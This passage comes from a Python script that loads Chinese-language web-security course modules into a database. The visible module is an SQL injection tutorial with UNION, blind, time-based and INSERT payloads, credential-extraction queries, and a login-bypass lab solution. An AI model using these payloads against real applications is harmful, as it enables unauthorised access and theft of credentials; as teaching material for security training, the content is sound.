-- 提升权限
UPDATE users SET admin = 1 WHERE id = 1
```

## INSERT语句中的SQL注入

想象一个应用程序，将用户注册信息插入数据库：

```sql
INSERT INTO users (username, password) VALUES ('test', 'password')
```

如果注入`username`参数：

```sql
-- 插入额外用户
INSERT INTO users (username, password) VALUES ('test', 'password'), ('admin', 'hacked')

-- 在密码中插入恶意值
INSERT INTO users (username, password) VALUES ('test', ''), ('admin', 'hacked'))
```

## 表名和列名中的SQL注入

有些应用程序使用用户提供的数据动态构造表名或列名：

```sql
SELECT * FROM table_name WHERE ...
```

攻击者可以注入：

```sql
-- 访问不同的表
SELECT * FROM users WHERE ...
```

## ORDER BY子句中的SQL注入

有些应用程序允许用户指定排序顺序：

```sql
SELECT * FROM products ORDER BY column_name
```

攻击者可以注入：

```sql
-- 执行盲注入
SELECT * FROM products ORDER BY (SELECT CASE WHEN (1=1) THEN column_name ELSE id END)

-- 时间注入
SELECT * FROM products ORDER BY (SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(5)) ELSE column_name END)
```

## SQL注入查询链

有时，应用程序执行多个查询，其中一个是另一个的输入。在这种情况下，注入可能在查询链中的任何位置。

## 提取数据库信息

使用SQL注入，你可以提取有关数据库的信息：

```sql
-- MySQL
' UNION SELECT table_name, 2 FROM information_schema.tables --

-- PostgreSQL
' UNION SELECT table_name, 2 FROM pg_tables --

-- SQL Server
' UNION SELECT table_name, 2 FROM information_schema.tables --
```

## 提取数据库内容

```sql
-- MySQL
' UNION SELECT username, password FROM users --

-- PostgreSQL
' UNION SELECT username, password FROM pg_user --
```

# 次破坏应用程序逻辑

## 绕过登录

想象一个应用程序，允许用户使用用户名和密码登录。如果用户提交用户名`wiener`和密码`bluecheese`，应用程序通过执行以下SQL查询来检查凭据：

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

如果查询返回用户的详细信息，则登录成功。否则，它将被拒绝。

在这种情况下，攻击者可以在不需要密码的情况下以任何用户身份登录。他们可以使用SQL注释序列`--`从查询的`WHERE`子句中删除密码检查。例如，提交用户名`administrator'--`和空白密码会导致以下查询：

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

此查询返回`username`为`administrator`的用户，并成功将攻击者登录为该用户。

## 实验室：SQL注入漏洞允许登录绕过

这个实验室在登录功能中包含SQL注入漏洞。

要解决此实验室，请执行SQL注入攻击，以`administrator`用户身份登录到应用程序。

### 解决步骤

1. 使用Burp Suite拦截和修改登录请求。
2. 将`username`参数的值修改为：`administrator'--`
"""

# 更新模块内容
modules_updates = [
    # CORS modules
    (1, cors_module1_content),
    (2, cors_module2_content),
    (3, cors_module3_content),
    
    # SSRF modules
    (4, ssrf_module1_content),
    (5, ssrf_module2_content),
    (6, ssrf_module3_content),
    (7, ssrf_module4_content),
    
    # WebSocket modules
    (8, websocket_module1_content),
    (9, websocket_module2_content),
    (10, websocket_module3_content),
    
    # WCD modules
    (11, wcd_module1_content),
    (12, wcd_module2_content),
    (13, wcd_module3_content),
    
    # SQL modules
    (14, sql_module1_content),
    (15, sql_module2_content),
    (16, sql_module3_content),
    (17, sql_module4_content),
]

# 更新所有模块
for module_id, new_content in modules_updates:
    try:
        module = PathModule.objects.get(id=module_id)
        print(f"更新模块 {module_id}: {module.title}")
        module.content = new_content
        module.save()
        print(f"  ✓ 内容长度: {len(new_content)} 字符")
    except PathModule.DoesNotExist:
        print(f"  ✗ 模块 {module_id} 不存在")
    except Exception as e:
        print(f"  ✗ 更新失败: {e}")

print("\n所有模块内容已更新完成！")
